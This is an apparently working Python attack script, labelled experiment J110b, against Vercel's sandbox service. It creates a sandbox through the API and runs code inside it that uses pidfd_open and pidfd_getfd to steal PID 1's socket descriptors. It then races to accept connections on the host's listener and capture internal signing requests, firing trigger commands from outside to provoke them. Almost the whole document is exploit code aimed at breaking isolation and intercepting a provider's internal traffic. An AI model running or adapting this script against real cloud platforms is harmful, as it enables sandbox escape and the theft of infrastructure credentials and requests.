# 实验J110b: pidfd 复制 listener fd 4 → accept 竞争捕获宿主签名请求 (cmd 走短连接)
import json, time, urllib.request, urllib.error, sys, base64, threading
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj110b"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, select, ctypes, time, threading, socket

libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
def sc(nr, *args):
    ctypes.set_errno(0)
    r = libc.syscall(nr, *args)
    return r, ctypes.get_errno()

fdmap = {}
for fd in sorted(os.listdir("/proc/1/fd"), key=int):
    try:
        fdmap[int(fd)] = os.readlink("/proc/1/fd/" + fd)
    except Exception:
        pass
print("fdmap:", fdmap, flush=True)
sock_fds = [fd for fd, ln in fdmap.items() if "socket:" in ln]
print("socket fds:", sock_fds, flush=True)

pfd, e = sc(434, 1, 0)
print("pidfd_open:", pfd, e, flush=True)

captured = []
stop = threading.Event()

def reader_thread(copies):
    while not stop.is_set():
        if not copies:
            break
        rl, _, _ = select.select(list(copies.values()), [], [], 0.5)
        for tfd, nfd in list(copies.items()):
            if nfd in rl:
                try:
                    d = os.read(nfd, 65536)
                    if d:
                        captured.append(("READ", tfd, time.time(), d))
                except BlockingIOError:
                    pass
                except OSError as ex:
                    captured.append(("READ-ERR", tfd, time.time(), str(ex).encode()))

if pfd >= 0:
    # 复制所有 socket fd
    copies = {}
    for tfd in sock_fds:
        nfd, e2 = sc(438, pfd, tfd, 0)
        if nfd >= 0:
            try:
                os.set_blocking(nfd, False)
                copies[tfd] = nfd
            except Exception:
                pass
    print("copied:", copies, flush=True)

    threading.Thread(target=reader_thread, args=(copies,), daemon=True).start()

    # listener accept: 复制 fd 4 为阻塞 socket,持续 accept 竞争
    # 需要找到哪个是 listener —— 尝试对每个 socket fd 构建 socket 对象并 accept
    def accept_thread(pfd):
        lid, e2 = sc(438, pfd, 4, 0)
        if lid < 0:
            print("listener dup fail:", e2, flush=True)
            return
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM, fileno=lid)
            s.settimeout(0.5)
            while not stop.is_set():
                try:
                    conn, _ = s.accept()
                    conn.settimeout(2)
                    chunks = []
                    while True:
                        try:
                            d = conn.recv(65536)
                            if not d:
                                break
                            chunks.append(d)
                        except socket.timeout:
                            break
                        except OSError:
                            break
                    captured.append(("ACCEPT", 4, time.time(), b"".join(chunks)))
                    try:
                        conn.close()
                    except OSError:
                        pass
                except socket.timeout:
                    continue
                except OSError as ex:
                    print("accept err:", ex, flush=True)
                    break
        except Exception as ex:
            print("listener exc:", repr(ex), flush=True)
    threading.Thread(target=accept_thread, args=(pfd,), daemon=True).start()

    print("LISTENER_READY", flush=True)
    deadline = time.time() + 55
    printed = set()
    while time.time() < deadline:
        for kind, tfd, t, d in captured:
            key = (kind, tfd, len(d))
            if key not in printed:
                printed.add(key)
                print(f"\n### CAP kind={kind} fd={tfd} t={t:.1f} len={len(d)} ###", flush=True)
                if d.startswith(b"ERR"):
                    print("MSG:", d.decode(errors="replace"), flush=True)
                else:
                    try:
                        txt = d.decode("latin1")
                        print("TXT:", txt[:1500].replace("\r", "\\r").replace("\n", "\\n"), flush=True)
                    except Exception:
                        pass
                    print("HEX:", d[:600].hex(), flush=True)
        time.sleep(1)
    stop.set()
    time.sleep(1)
    print("LISTENER_DONE total=%d unique=%d" % (len(captured), len(printed)), flush=True)
"""
print(">> 启动监听+accept竞争(55s), 本地高频触发 cmd", flush=True)

def trigger():
    for i in range(22):
        try:
            body = {"command": "echo", "args": ["trig-%d" % i], "wait": True, "logs": True, "timeout": 100}
            c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
            print(f"  trigger[{i}] -> {c}", flush=True)
        except Exception as ex:
            print(f"  trigger[{i}] EXC {ex}", flush=True)
        time.sleep(2)

th = threading.Thread(target=trigger, daemon=True)
th.start()
run_cmd(sid, PROBE, "accept-capture", wait=True, timeout=300000)
th.join(timeout=1)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
